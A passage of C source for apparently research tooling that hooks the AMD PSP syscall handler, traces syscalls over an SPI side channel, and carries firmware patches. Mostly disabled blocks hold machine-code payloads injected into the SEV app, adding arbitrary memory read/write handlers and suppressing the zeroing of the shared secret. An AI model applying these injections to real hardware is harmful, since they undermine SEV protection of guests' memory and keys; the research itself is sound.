#include <types.h>
#include <cdefs.h>
#include <psp.h>

#include <svc_id.h>

#define SVC_TRACE_FMT_STRING_COMPACT
#include "psp-svc-trace.h"

#define PSP_CCX_ID_ADDR (0xcb00)

static const uint32_t g_u32SevVersId = 0x01001116;

#if 0
#define SEV_SMN_OP_OVERRIDE_ADDR (0x165e2)
const char sev_smn_op_override[] =
{
    0x2d, 0xe9, 0xf8, 0x4f, /* push { r3, r4, r5, r6, r7, r8, r9, r10, r11, lr } */
    0x4f, 0xf4, 0x68, 0x34, /* mov.w r4, #0x3a000 */
    0x44, 0xf0, 0x01, 0x04, /* orr r4, r4, #1 */
    0xa0, 0x47,             /* blx r4 */
    0xbd, 0xe8, 0xf8, 0x8f  /* pop.w { r3, r4, r5, r6, r7, r8, r9, r10, r11, pc } */
};

#define SEV_SMN_OP_INJECT_ADDR (0x3a000)
const char sev_smn_op_inject[609] = {
    0x2d, 0xe9, 0xf7, 0x43, 0x1c, 0x46, 0x81, 0x46, 0x00, 0x23, 0x0d, 
    0x46, 0x01, 0x93, 0x16, 0x46, 0x00, 0x2a, 0x73, 0xd0, 0x00, 0xf0, 
    0x07, 0x08, 0xc1, 0xf3, 0x09, 0x03, 0x01, 0xa9, 0x43, 0xea, 0x88, 
    0x28, 0x3a, 0x4b, 0x08, 0xf5, 0xe0, 0x38, 0x40, 0x46, 0x98, 0x47, 
    0x07, 0x46, 0x00, 0x28, 0x67, 0xd1, 0xb9, 0xf1, 0x05, 0x0f, 0x09, 
    0xd1, 0xa5, 0xf5, 0x40, 0x75, 0xff, 0x2d, 0x05, 0xd8, 0x03, 0x2c, 
    0x4f, 0xd8, 0xdf, 0xe8, 0x04, 0xf0, 0x08, 0x18, 0x2b, 0x3b, 0x30, 
    0x4b, 0x98, 0x47, 0x00, 0x28, 0xf5, 0xd0, 0x07, 0x46, 0x4c, 0xe0, 
    0x01, 0x9b, 0x2e, 0x48, 0x1b, 0x68, 0x33, 0x60, 0x00, 0xf0, 0xe8, 
    0xf8, 0x40, 0x46, 0x00, 0xf0, 0x82, 0xf8, 0x2b, 0x48, 0x00, 0xf0, 
    0xe2, 0xf8, 0x30, 0x68, 0x00, 0xf0, 0x7c, 0xf8, 0x3c, 0xe0, 0x01, 
    0x9b, 0x28, 0x48, 0xd3, 0xe9, 0x00, 0x45, 0xc6, 0xe9, 0x00, 0x45, 
    0x00, 0xf0, 0xd6, 0xf8, 0x40, 0x46, 0x00, 0xf0, 0x70, 0xf8, 0x22, 
    0x48, 0x00, 0xf0, 0xd0, 0xf8, 0xd6, 0xe9, 0x00, 0x01, 0x00, 0xf0, 
    0x96, 0xf8, 0x29, 0xe0, 0x20, 0x48, 0x00, 0xf0, 0xc8, 0xf8, 0x40, 
    0x46, 0x00, 0xf0, 0x62, 0xf8, 0x1b, 0x48, 0x00, 0xf0, 0xc2, 0xf8, 
    0x30, 0x68, 0x00, 0xf0, 0x5c, 0xf8, 0x32, 0x68, 0x01, 0x9b, 0x1a, 
    0x60, 0x19, 0xe0, 0x19, 0x48, 0x00, 0xf0, 0xb8, 0xf8, 0x40, 0x46, 
    0x00, 0xf0, 0x52, 0xf8, 0x13, 0x48, 0x00, 0xf0, 0xb2, 0xf8, 0xd6, 
    0xe9, 0x00, 0x01, 0x00, 0xf0, 0x78, 0xf8, 0xd6, 0xe9, 0x00, 0x23, 
    0x01, 0x99, 0xc1, 0xe9, 0x00, 0x23, 0x06, 0xe0, 0xbf, 0xf3, 0x5f, 
    0x8f, 0x0f, 0x48, 0x00, 0xf0, 0xa3, 0xf8, 0x48, 0xf2, 0x03, 0x07, 
    0x01, 0x98, 0x28, 0xb1, 0x0d, 0x4b, 0x98, 0x47, 0x02, 0xe0, 0x48, 
    0xf2, 0x03, 0x00, 0x00, 0xe0, 0x38, 0x46, 0x03, 0xb0, 0xbd, 0xe8, 
    0xf0, 0x83, 0x00, 0xbf, 0xa9, 0x9d, 0x01, 0x00, 0x3d, 0x73, 0x01, 
    0x00, 0x38, 0xa2, 0x03, 0x00, 0x3b, 0xa2, 0x03, 0x00, 0x3d, 0xa2, 
    0x03, 0x00, 0x42, 0xa2, 0x03, 0x00, 0x47, 0xa2, 0x03, 0x00, 0x4c, 
    0xa2, 0x03, 0x00, 0xed, 0x9e, 0x01, 0x00, 0x02, 0x44, 0x90, 0x42, 
    0x02, 0xd0, 0x00, 0xf8, 0x01, 0x1b, 0xfa, 0xe7, 0x70, 0x47, 0x30, 
    0xb5, 0x87, 0xb0, 0x05, 0x46, 0x0c, 0x46, 0x68, 0x46, 0x00, 0x21, 
    0x15, 0x22, 0xff, 0xf7, 0xf0, 0xff, 0x28, 0x19, 0x00, 0x23, 0xa3, 
    0x42, 0x05, 0xd0, 0x10, 0xf8, 0x01, 0x2d, 0x0d, 0xf8, 0x03, 0x20, 
    0x01, 0x33, 0xf7, 0xe7, 0x68, 0x46, 0x00, 0xf0, 0x65, 0xf8, 0x07, 
    0xb0, 0x30, 0xbd, 0x14, 0x4b, 0x02, 0x46, 0x70, 0xb5, 0x88, 0xb0, 
    0x03, 0xac, 0x03, 0xf1, 0x10, 0x06, 0x18, 0x68, 0x08, 0x33, 0x53, 
    0xf8, 0x04, 0x1c, 0x25, 0x46, 0xb3, 0x42, 0x03, 0xc5, 0x2c, 0x46, 
    0xf6, 0xd1, 0x1b, 0x78, 0x00, 0x21, 0x2b, 0x70, 0x52, 0xb1, 0x02, 
    0xf0, 0x0f, 0x03, 0x08, 0xa8, 0x03, 0x44, 0x12, 0x09, 0x13, 0xf8, 
    0x14, 0x3c, 0x0d, 0xf8, 0x01, 0x30, 0x01, 0x31, 0xf3, 0xe7, 0x19, 
    0xb1, 0x68, 0x46, 0xff, 0xf7, 0xc5, 0xff, 0x02, 0xe0, 0x03, 0x48, 
    0x00, 0xf0, 0x3c, 0xf8, 0x08, 0xb0, 0x70, 0xbd, 0x50, 0xa2, 0x03, 
    0x00, 0x4e, 0xa2, 0x03, 0x00, 0xf0, 0xb5, 0x8b, 0xb0, 0x17, 0x4e, 
    0x02, 0x46, 0x0b, 0x46, 0x6f, 0x46, 0x06, 0xf1, 0x10, 0x0c, 0x30, 
    0x68, 0x08, 0x36, 0x56, 0xf8, 0x04, 0x1c, 0xbe, 0x46, 0x66, 0x45, 
    0xae, 0xe8, 0x03, 0x00, 0x77, 0x46, 0xf5, 0xd1, 0x31, 0x78, 0x39, 
    0x70, 0x00, 0x21, 0x52, 0xea, 0x03, 0x00, 0x0f, 0xd0, 0x02, 0xf0, 
    0x0f, 0x00, 0x0a, 0xae, 0x30, 0x44, 0x14, 0x09, 0x44, 0xea, 0x03, 
    0x74, 0x1d, 0x09, 0x10, 0xf8, 0x28, 0x6c, 0x05, 0xa8, 0x22, 0x46, 
    0x2b, 0x46, 0x0e, 0x54, 0x01, 0x31, 0xec, 0xe7, 0x19, 0xb1, 0x05, 
    0xa8, 0xff, 0xf7, 0x8f, 0xff, 0x02, 0xe0, 0x03, 0x48, 0x00, 0xf0, 
    0x06, 0xf8, 0x0b, 0xb0, 0xf0, 0xbd, 0x50, 0xa2, 0x03, 0x00, 0x4e, 
    0xa2, 0x03, 0x00, 0x06, 0xdf, 0xf7, 0x46, 0x52, 0x33, 0x32, 0x20, 
    0x00, 0x52, 0x36, 0x34, 0x20, 0x00, 0x57, 0x33, 0x32, 0x20, 0x00, 
    0x57, 0x36, 0x34, 0x20, 0x00, 0x0a, 0x00, 0x30, 0x00, 0x30, 0x31, 
    0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x61, 0x62, 0x63, 
    0x64, 0x65, 0x66, 0x00
};
#endif

#if 0
/* Patching the dbg_{decrypt|encrypt} handlers with our code. */

#define SEV_ARB_READWRITE_INJECT_ADDR (0x3a000)
const char sev_arb_readwrite[151] = {
    0x09, 0xa0, 0x03, 0x00, 0x31, 0xa0, 0x03, 0x00, 0x13, 0xb5, 0x0c, 
    0x46, 0x06, 0x48, 0x00, 0xf0, 0x23, 0xf8, 0xa2, 0x68, 0x00, 0x23, 
    0xd4, 0xe9, 0x00, 0x01, 0xcd, 0xe9, 0x00, 0x23, 0xe2, 0x68, 0x02, 
    0x4b, 0x98, 0x47, 0x02, 0xb0, 0x10, 0xbd, 0x5c, 0xa0, 0x03, 0x00, 
    0xef, 0x6e, 0x01, 0x00, 0x13, 0xb5, 0x0c, 0x46, 0x06, 0x48, 0x00, 
    0xf0, 0x0f, 0xf8, 0xa2, 0x68, 0x00, 0x23, 0xd4, 0xe9, 0x00, 0x01, 
    0xcd, 0xe9, 0x00, 0x23, 0xe2, 0x68, 0x02, 0x4b, 0x98, 0x47, 0x02, 
    0xb0, 0x10, 0xbd, 0x79, 0xa0, 0x03, 0x00, 0xb1, 0x6e, 0x01, 0x00, 
    0x06, 0xdf, 0xf7, 0x46, 0x52, 0x65, 0x61, 0x64, 0x20, 0x66, 0x72, 
    0x6f, 0x6d, 0x20, 0x50, 0x53, 0x50, 0x20, 0x74, 0x6f, 0x20, 0x58, 
    0x38, 0x36, 0x20, 0x6d, 0x65, 0x6d, 0x6f, 0x72, 0x79, 0x0a, 0x00, 
    0x57, 0x72, 0x69, 0x74, 0x65, 0x20, 0x74, 0x6f, 0x20, 0x50, 0x53, 
    0x50, 0x20, 0x66, 0x72, 0x6f, 0x6d, 0x20, 0x58, 0x38, 0x36, 0x20, 
    0x6d, 0x65, 0x6d, 0x6f, 0x72, 0x79, 0x0a, 0x00
};

#endif

#if 1 /* AR3B debug override. */
#define AR3B_DBG_OVERRIDE_1_ADDR (0x18a5e)
const char ar3b_dbg_override1[] =
{
    0x00, 0x00                  /* mov r0, r0 */
};

#define AR3B_DBG_OVERRIDE_2_ADDR (0x18a82)
const char ar3b_dbg_override2[] =
{
    0x01, 0xa8,                 /* add, r0, sp, #4 (Points to string buffer). */
    0x06, 0xdf,                 /* svc 0x6 */
    0x0d, 0xf5, 0x05, 0x7d,     /* add.w sp, sp, #0x214 */
    0xbd, 0xe8, 0xf0, 0x83      /* pop.w { r4, r5, r6, r7, r8, r9, pc } */
};
#endif

/**
 * Injected syscall handler for the PSP privileged part.
 */
int svc_inject_handler(uint32_t idxSyscall, PPSPREGFRAME pRegs, uint32_t *prcHnd);
int svc_app_cleanup_inject_handler(void);


static void svc_0x6_dbg_print(const char *psz);
static uint32_t get_cpu_id();
static int strncmp(const char *psz1, const char *psz2, uint32_t cch);
static int memcmp(const void *pv1, const void *pv2, size_t cb);
static void memcpy(void *pvDst, const void *pvSrc, size_t cb);

/** The assigned CPU ID for the PSP. */
static uint32_t g_uCpuId = 0xffffffff;
/** Flags controlling the svc tracer. */
static volatile uint32_t g_fSvcTraceArm = 0;

/* The SVC tracer is armed nad logs syscalls. */
#define PSP_SVC_TRACER_F_ARMED       0x1
/* Log unknown syscalls in a generic fashion. */
#define PSP_SVC_TRACER_F_LOG_UNK_SVC 0x2
/* Trace svc 6 syscalls. */
#define PSP_SVC_TRACER_F_LOG_SVC_6   0x4

static uint32_t g_fDumpSmnRegsOnMap = 0;

/* These are here so that the log dumper doesn't get triggered when the app containing the injection code gets triggered. */
volatile uint32_t g_PspDetectMark1 = SVC_PSP_DETECT_MARKER_1 - 1;
volatile uint32_t g_PspDetectMark2 = SVC_PSP_DETECT_MARKER_2 - 1;
volatile uint32_t g_PspDetectMark3 = SVC_PSP_DETECT_MARKER_3 - 1;
volatile uint32_t g_PspDetectMark4 = SVC_PSP_DETECT_MARKER_4 - 1;
volatile uint32_t g_PspLogMarkStr  = SVC_PSP_LOG_MARKER_STRING - 1;


#define PSP_MAP_X86_HOST_MEMORY_EX_ADDR (0x6090 | 0x1)
typedef void *FNMAPX86HOSTMEMORYEX(uint64_t PhysX86Addr, uint32_t enmType, uint32_t fFlags);
typedef FNMAPX86HOSTMEMORYEX *PFNMAPX86HOSTMEMORYEX;

typedef uint32_t FNPSPSVCHANDLER(uint32_t idxSyscall, PPSPREGFRAME pRegs);
typedef FNPSPSVCHANDLER *PFNPSPSVCHANDLER;
#define PSP_SVC_HANDLER_ADDR (0x9519)

typedef uint32_t FNPSPINVMEM(uint32_t enmInvOp, uint8_t fData, void *pvStart, uint32_t cb);
typedef FNPSPINVMEM *PFNPSPINVMEM;
#define PSP_INV_MEM_ADDR (0x170c | 1)

static size_t strlen(const char *pszStr)
{
    size_t cch = 0;
    while (*pszStr++ != '\0')
        cch++;

    return cch;
}

/**
 * Dumps a 16bit value to the SPI logging side channel.
 *
 * @returns nothing.
 * @param   u16Val              The 16bit value to dump.
 */
static void svcTraceDumpVal(uint16_t u16Val)
{
    *(volatile uint32_t *)0x01AAB000 = (g_uCpuId << 16) | (uint32_t)u16Val;
}

static void svcTraceBegin(void)
{
#if defined(SVC_TRACE_FMT_STRING) || defined(SVC_TRACE_FMT_STRING_COMPACT)
    svcTraceDumpVal(SVC_PSP_LOG_MARKER_STRING);
#else
    svcTraceDumpVal(SVC_PSP_LOG_MARKER_BINARY);
#endif
}

static void svcTraceEnd(void)
{
#if defined(SVC_TRACE_FMT_STRING) || defined(SVC_TRACE_FMT_STRING_COMPACT)
    svcTraceDumpVal(SVC_PSP_LOG_MARKER_STRING);
#else
    svcTraceDumpVal(SVC_PSP_LOG_MARKER_BINARY);
#endif
}

#if defined(SVC_TRACE_FMT_STRING) || defined(SVC_TRACE_FMT_STRING_COMPACT)
static void svcTraceAppendBufReverse(char *pachBuf, uint32_t offBuf)
{
    size_t cchAlign = offBuf & ~(uint32_t)0x1;

    while (cchAlign > 0)
    {
        svcTraceDumpVal((pachBuf[offBuf -  2] << 8) | pachBuf[offBuf - 1]);
        offBuf   -= sizeof(uint16_t);
        cchAlign -= sizeof(uint16_t);
    }

    /* Unaligned byte. */
    if (offBuf)
        svcTraceDumpVal(pachBuf[offBuf - 1]);
}

static void svcTraceAppendStringN(const char *pszStr, size_t cchStr)
{
    size_t cchAlign = cchStr & ~(uint32_t)0x1;
    size_t cchRem = cchStr - cchAlign;

    while (cchAlign > 0)
    {
        svcTraceDumpVal(*(uint16_t *)pszStr);
        cchAlign -= sizeof(uint16_t);
        pszStr += sizeof(uint16_t);
    }

    switch (cchRem)
    {
        case 0:
            break;
        case 1:
            svcTraceDumpVal(*pszStr);
            break;
        default:
            do { } while (1);
    }
}

static void svcTraceAppendString(const char *pszStr)
{
    size_t cchStr = strlen(pszStr);
    svcTraceAppendStringN(pszStr, cchStr);
}

static void svcTraceAppendHexU32(uint32_t u32)
{
    char achDigits[] = "0123456789abcdef";
    char aszBuf[10];
    unsigned offBuf = 0;

    while (u32)
    {
        uint8_t u8Val = u32 & 0xf;
        u32 >>= 4;

        aszBuf[offBuf++] = achDigits[u8Val];
    }

    svcTraceAppendString("0x");
    if (offBuf)
        svcTraceAppendBufReverse(aszBuf, offBuf);
    else
        svcTraceAppendString("0");
}

#if !defined(SVC_TRACE_FMT_STRING_COMPACT)
static void svcTraceAppendU32(uint32_t u32)
{
    char achDigits[] = "0123456789";
    char aszBuf[32];
    unsigned offBuf = 0;

    while (u32)
    {
        uint8_t u8Val = u32 % 10;
        u32 /= 10;

        aszBuf[offBuf++] = achDigits[u8Val];
    }

    if (offBuf)
        svcTraceAppendBufReverse(aszBuf, offBuf);
    else
        svcTraceAppendString("0");
}
#else
# define svcTraceAppendU32 svcTraceAppendHexU32
#endif

static void svcTraceAppendS32(int32_t i32)
{
    /* Add sign? */
    if (i32 < 0)
    {
        svcTraceAppendString("-");
        i32 = ABS(i32);
    }

    /* Treat as unsigned from here on. */
    svcTraceAppendU32((uint32_t)i32);
}

static void svcTraceAppendHexU64(uint64_t u64)
{
    char achDigits[] = "0123456789abcdef";
    char aszBuf[20];
    unsigned offBuf = 0;

    /** @todo: Optimize. */

    while (u64)
    {
        uint8_t u8Val = u64 & 0xf;
        u64 >>= 4;

        aszBuf[offBuf++] = achDigits[u8Val];
    }

    svcTraceAppendString("0x");
    if (offBuf)
        svcTraceAppendBufReverse(aszBuf, offBuf);
    else
        svcTraceAppendString("0");
}

static void svcTraceAppendBuf(uint8_t *pbPtr, size_t cbPtr)
{
    svcTraceAppendString("{ ");
    for (uint32_t i = 0; i < cbPtr; i++)
    {
        svcTraceAppendHexU32(pbPtr[i]);
        svcTraceAppendString(", ");
    }
    svcTraceAppendString(" }");
}

#elif defined(SVC_TRACE_FMT_BINARY)

static void svcTraceAppendHexU32(uint32_t u32)
{
    svcTraceDumpVal(u32 & 0xffff);
    svcTraceDumpVal((u32 >> 16) & 0xffff);
}

static void svcTraceAppendStringN(const char *pszStr, size_t cchStr)
{
    size_t cchAlign = cchStr & ~(uint32_t)0x1;
    size_t cchRem = cchStr - cchAlign;

    /* Write the size first - excluding the terminator. */
    svcTraceAppendHexU32(cchStr);

    while (cchAlign > 0)
    {
        svcTraceDumpVal(*(uint16_t *)pszStr);
        cchAlign -= sizeof(uint16_t);
        pszStr += sizeof(uint16_t);
    }

    switch (cchRem)
    {
        case 0:
            break;
        case 1:
            svcTraceDumpVal(*pszStr);
            break;
        default:
            do { } while (1);
    }
}

static void svcTraceAppendString(const char *pszStr)
{
    size_t cchStr = strlen(pszStr);
    svcTraceAppendStringN(pszStr, cchStr);
}

static void svcTraceAppendBuf(const uint8_t *pbBuf, size_t cbBuf)
{
    size_t cbAlign = cbBuf & ~(uint32_t)0x1;
    size_t cbRem = cbBuf - cbAlign;

    /* Write the size first. */
    svcTraceAppendHexU32(cbBuf);

    while (cbAlign > 0)
    {
        svcTraceDumpVal(*(uint16_t *)pbBuf);
        cbAlign -= sizeof(uint16_t);
        pbBuf += sizeof(uint16_t);
    }

    switch (cbRem)
    {
        case 0:
            break;
        case 1:
            svcTraceDumpVal(*pbBuf);
            break;
        default:
            do { } while (1);
    }
}

static void svcTraceAppendU32(uint32_t u32)
{
    svcTraceAppendHexU32(u32);
}

static void svcTraceAppendS32(int32_t i32)
{
    svcTraceAppendHexU32((uint32_t)i32);
}

static void svcTraceAppendHexU64(uint64_t u64)
{
    svcTraceDumpVal(u64 & 0xffff);
    svcTraceDumpVal((u64 >> 16) & 0xffff);
    svcTraceDumpVal((u64 >> 32) & 0xffff);
    svcTraceDumpVal((u64 >> 48) & 0xffff);
}
#else
# error "Either SVC_TRACE_FMT_STRING or SVC_TRACE_FMT_BINARY or SVC_TRACE_FMT_STRING_COMPACT must be defined"
#endif

static const SVCENTRY *svcTraceGetEntry(uint32_t idxSyscall)
{
    const SVCENTRY *pSvcEntry = NULL;

    if (   idxSyscall < ELEMENTS(g_aSvcEntries)
        && idxSyscall != SVC_DBG_PRINT)
        pSvcEntry = &g_aSvcEntries[idxSyscall];

    return pSvcEntry;
}

static void svcTraceArgs(const SVCENTRY *pEntry, PPSPREGFRAME pRegs, uint8_t fExitOnly)
{
    uint32_t idxRegArg = 0;
    for (uint32_t i = 0; i < pEntry->cArgs; i++)
    {
        const SVCARG *pArg = &pEntry->paArgs[i];
        uint32_t uArgType  = SVC_LOG_ARG_TYPE_GET(pArg->fArg);
        uint32_t uArgFlags = SVC_LOG_ARG_LOG_F_GET(pArg->fArg);

        if (   (uArgFlags & SVC_LOG_ARG_LOG_F_EXIT)
            || !fExitOnly)
        {
/* The argument name is not required for the binary format as it is extracted from the log parser. */
#ifdef SVC_TRACE_FMT_STRING
            svcTraceAppendString(" ");
            svcTraceAppendString(pArg->pszName);
            svcTraceAppendString("=");
#elif defined(SVC_TRACE_FMT_STRING_COMPACT)
            svcTraceAppendString(" ");
#endif

            switch (uArgType)
            {
                case SVC_LOG_ARG_TYPE_UINT8:
                case SVC_LOG_ARG_TYPE_UINT16:
                case SVC_LOG_ARG_TYPE_UINT32:
                {
                    uint32_t uVal = pRegs->auGprs[idxRegArg++];
                    if (uArgFlags & SVC_LOG_ARG_LOG_F_HEX)
                        svcTraceAppendHexU32(uVal);
                    else
                        svcTraceAppendU32(uVal);
                    break;
                }
                case SVC_LOG_ARG_TYPE_INT8:
                case SVC_LOG_ARG_TYPE_INT16:
                case SVC_LOG_ARG_TYPE_INT32:
                {
                    int32_t iVal = pRegs->auGprs[idxRegArg++];
                    svcTraceAppendS32(iVal);
                    break;
                }
                case SVC_LOG_ARG_TYPE_PSP_ADDR:
                {
                    uint32_t PtrUsr = pRegs->auGprs[idxRegArg++];
                    svcTraceAppendHexU32(PtrUsr);
                    if (pArg->cbPtr)
                    {
                        uint8_t *pbPtr = (uint8_t *)(uintptr_t)PtrUsr;
                        svcTraceAppendBuf(pbPtr, pArg->cbPtr);
                    }
                    break;
                }
                case SVC_LOG_ARG_TYPE_UINT64:
                case SVC_LOG_ARG_TYPE_X86_ADDR:
                {
                    /*
                     * Advance the register index if it is odd (ARM calling convention to pass
                     * a 64bit value in two 32bit registers mandates that it starts on an even register index).
                     */
                    if (idxRegArg & 0x1)
                        idxRegArg++;
                    uint64_t u64Val = ((uint64_t)pRegs->auGprs[idxRegArg+1] << 32) | pRegs->auGprs[idxRegArg];
                    idxRegArg += 2;
                    svcTraceAppendHexU64(u64Val);
                    break;
                }
                case SVC_LOG_ARG_TYPE_STRING:
                {
                    const char *psz = (const char *)pRegs->auGprs[idxRegArg++];
                    svcTraceAppendString(psz);
                    break;
                }
                case SVC_LOG_ARG_TYPE_INT64:
                default:
                    svcTraceAppendString("<INVALID ARG TYPE>");
            }
        }
    }
}

static void svcTraceEntry(uint32_t idxSyscall, PPSPREGFRAME pRegs)
{
    if (!(g_fSvcTraceArm & PSP_SVC_TRACER_F_ARMED))
        return;

    if (   idxSyscall == SVC_DBG_PRINT
        && !(g_fSvcTraceArm & PSP_SVC_TRACER_F_LOG_SVC_6))
        return;

    /* Try to log the arguments of the syscall. */
    const SVCENTRY *pEntry = svcTraceGetEntry(idxSyscall);
    if (pEntry)
    {
        svcTraceBegin();
#ifdef SVC_TRACE_FMT_STRING
        if (pEntry->pszName)
            svcTraceAppendString(pEntry->pszName);
        else
        {
            svcTraceAppendString("svc_psp_");
            svcTraceAppendHexU32(idxSyscall);
        }

        svcTraceAppendString(":");
#elif defined(SVC_TRACE_FMT_STRING_COMPACT)
        svcTraceAppendString("svc_psp_");
        svcTraceAppendHexU32(idxSyscall);
        svcTraceAppendString(": ");
#elif defined(SVC_TRACE_FMT_BINARY)
        svcTraceAppendHexU32(idxSyscall);
#else
# error "Either SVC_TRACE_FMT_STRING or SVC_TRACE_FMT_BINARY or SVC_TRACE_FMT_STRING_COMPACT must be defined"
#endif

        svcTraceArgs(pEntry, pRegs, 0);

#if defined(SVC_TRACE_FMT_STRING) || defined(SVC_TRACE_FMT_STRING_COMPACT)
        svcTraceAppendString("\n");
#endif
        svcTraceEnd();
    }
    else if (g_fSvcTraceArm & PSP_SVC_TRACER_F_LOG_UNK_SVC)
    {
        svcTraceBegin();

#if defined(SVC_TRACE_FMT_STRING) || defined(SVC_TRACE_FMT_STRING_COMPACT)
        svcTraceAppendString("svc_psp_");
        svcTraceAppendHexU32(idxSyscall);
        svcTraceAppendString(": ");
        svcTraceAppendHexU32(pRegs->auGprs[0]);
        svcTraceAppendString(" ");
        svcTraceAppendHexU32(pRegs->auGprs[1]);
        svcTraceAppendString(" ");
        svcTraceAppendHexU32(pRegs->auGprs[2]);
        svcTraceAppendString(" ");
        svcTraceAppendHexU32(pRegs->auGprs[3]);
        svcTraceAppendString("\n");
#elif defined(SVC_TRACE_FMT_BINARY)
        svcTraceAppendHexU32(idxSyscall);
        svcTraceAppendHexU32(pRegs->auGprs[0]);
        svcTraceAppendHexU32(pRegs->auGprs[1]);
        svcTraceAppendHexU32(pRegs->auGprs[2]);
        svcTraceAppendHexU32(pRegs->auGprs[3]);
#else
# error "Either SVC_TRACE_FMT_STRING or SVC_TRACE_FMT_BINARY or SVC_TRACE_FMT_STRING_COMPACT must be defined"
#endif

        svcTraceEnd();
    }
}

static void svcTraceExit(uint32_t idxSyscall, PPSPREGFRAME pRegs, uint32_t u32Ret)
{
    if (!(g_fSvcTraceArm & PSP_SVC_TRACER_F_ARMED))
        return;

    if (   idxSyscall == SVC_DBG_PRINT
        && !(g_fSvcTraceArm & PSP_SVC_TRACER_F_LOG_SVC_6))
        return;

    /* Try to log the arguments of the syscall. */
    const SVCENTRY *pEntry = svcTraceGetEntry(idxSyscall);
    if (pEntry)
    {
        svcTraceBegin();

#ifdef SVC_TRACE_FMT_STRING
        svcTraceAppendString("    ");
        if (pEntry->pszName)
            svcTraceAppendString(pEntry->pszName);
        else
        {
            svcTraceAppendString("svc_psp_");
            svcTraceAppendHexU32(idxSyscall);
        }

        svcTraceAppendString(":");

        svcTraceAppendString(" -> u32Ret=");
#elif defined(SVC_TRACE_FMT_STRING_COMPACT)
        svcTraceAppendString("    ");
        svcTraceAppendString("svc_psp_");
        svcTraceAppendHexU32(idxSyscall);
        svcTraceAppendString(":");

        svcTraceAppendString(" -> ");
#elif defined(SVC_TRACE_FMT_BINARY)
        svcTraceAppendHexU32(idxSyscall);
#else
# error "Either SVC_TRACE_FMT_STRING or SVC_TRACE_FMT_BINARY or SVC_TRACE_FMT_STRING_COMPACT must be defined"
#endif
        svcTraceAppendHexU32(u32Ret);

        svcTraceArgs(pEntry, pRegs, 1);

#if defined(SVC_TRACE_FMT_STRING) || defined(SVC_TRACE_FMT_STRING_COMPACT)
        svcTraceAppendString("\n");
#endif
        svcTraceEnd();
    }
    else if (g_fSvcTraceArm & PSP_SVC_TRACER_F_LOG_UNK_SVC)
    {
        svcTraceBegin();

#if defined(SVC_TRACE_FMT_STRING) || defined(SVC_TRACE_FMT_STRING_COMPACT)
        svcTraceAppendString("    ");
        svcTraceAppendString("svc_psp_");
        svcTraceAppendHexU32(idxSyscall);
        svcTraceAppendString(":");
        svcTraceAppendString(" -> ");
#elif defined(SVC_TRACE_FMT_BINARY)
        svcTraceAppendHexU32(idxSyscall);
#else
# error "Either SVC_TRACE_FMT_STRING or SVC_TRACE_FMT_BINARY or SVC_TRACE_FMT_STRING_COMPACT must be defined"
#endif
        svcTraceAppendHexU32(u32Ret);

#if defined(SVC_TRACE_FMT_STRING) || defined(SVC_TRACE_FMT_STRING_COMPACT)
        svcTraceAppendString("\n");
#endif
        svcTraceEnd();
    }
}

static void svcTraceDumpPspDetectionMarkers(void)
{
    if (g_PspDetectMark1 == SVC_PSP_DETECT_MARKER_1 - 1)
    {
        g_PspDetectMark1++;
        g_PspDetectMark2++;
        g_PspDetectMark3++;
        g_PspDetectMark4++;
        g_PspLogMarkStr++;
    }

    svcTraceDumpVal(g_PspDetectMark1);
    svcTraceDumpVal(g_PspDetectMark2);
    svcTraceDumpVal(g_PspDetectMark3);
    svcTraceDumpVal(g_PspDetectMark4);
}

static void svcTraceDumpLogMarker(void)
{
    svcTraceDumpVal(g_PspLogMarkStr);
}

uint32_t svc_trace_intercept(uint32_t idxSyscall, PPSPREGFRAME pRegs)
{
    if (idxSyscall == 0x1)
    {
         /*
          * Dump the detection markers everytime an APP is initialized so we can start and stop
          * the logic analyzer at will.
          */
        svcTraceDumpPspDetectionMarkers();
        svcTraceDumpLogMarker();
        svcTraceAppendString("initialized, version: ");
        svcTraceAppendHexU32(*(uint32_t *)(0x15000 + 0x60));
        svcTraceAppendString("\n");
        /* Apply app specific code injections. */
        if (*(uint32_t *)(0x15000 + 0x60) == g_u32SevVersId)
        {
#if 0
            /* Patching read buffer syscall into master secret derivation */
            svcTraceAppendString("SEV APP initialized, overriding shared secret memzero\n");
            (*(uint32_t*)(0x1731a)) = 0x0000dfff;
#endif
#if 0
            svcTraceAppendString("SEV APP initialized, overriding sev_smn_op()\n");
            svcTraceAppendBuf((uint8_t *)SEV_SMN_OP_OVERRIDE_ADDR, sizeof(sev_smn_op_override));
            svcTraceAppendString("\n");
            memcpy((void *)SEV_SMN_OP_OVERRIDE_ADDR, sev_smn_op_override, sizeof(sev_smn_op_override));
            memcpy((void *)SEV_SMN_OP_INJECT_ADDR, sev_smn_op_inject, sizeof(sev_smn_op_inject));
#endif
#if 0
            svcTraceAppendString("SEV APP initialized, injecting arbitrary read/write functions\n");
            memcpy((void *)SEV_ARB_READWRITE_INJECT_ADDR, sev_arb_readwrite, sizeof(sev_arb_readwrite));
            /* Patch the request handler table. */
            uint32_t *paAddr = (uint32_t *)(uintptr_t)SEV_ARB_READWRITE_INJECT_ADDR;
            *(uint32_t *)(0x1cd98) = paAddr[1]; /* Arbitrary write */
            *(uint32_t *)(0x1cda0) = *paAddr; /* Arbitrary read */

            uint8_t *pbOverride = (uint8_t *)0x1880f;
            *pbOverride++ = 0xe0;
#endif
            g_fSvcTraceArm |= PSP_SVC_TRACER_F_ARMED;

#if 0 /* Dumps the globally stored CCX ID and activates dumping the SMN mapping control registers. */
            g_fDumpSmnRegsOnMap = 0xdeadbeef;
            svcTraceAppendString("0xcb00: ");
            svcTraceAppendHexU32(*(uint32_t *)0xcb00);
            svcTraceAppendString("\n");
#endif

#if 0 /* This dumps the SMN blocks where each CCX can be found from another one. */
            for (uint32_t i = 0; i < 64; i++)
            {
                svcTraceAppendString(": ");
                svcTraceAppendHexU32((uint32_t)*(uint8_t *)(0x3fa55 + 0xb + i));
                svcTraceAppendString("\n");
            }
#endif
        }

        svcTraceDumpLogMarker();
    }

    svcTraceEntry(idxSyscall, pRegs);

    switch (idxSyscall)
    {
        case SVC_SMN_MAP_ADDR_EX:
        case SVC_SMN_MAP_ADDR:
        case SVC_SMN_UNMAP_ADDR:
        {
            /* Dump the mapping control registers if enabled, one 32bit register controls two mapping ranges. */
            if (g_fDumpSmnRegsOnMap == 0xdeadbeef)
            {
#if 0
                svcTraceDumpVal(SVC_PSP_LOG_MARKER_STRING);
                svcTraceAppendString("SmnMapReg:\n");
                for (uint32_t i = 0; i < 16; i++)
                {
                    svcTraceAppendString("    [");
                    svcTraceAppendHexU32(i);
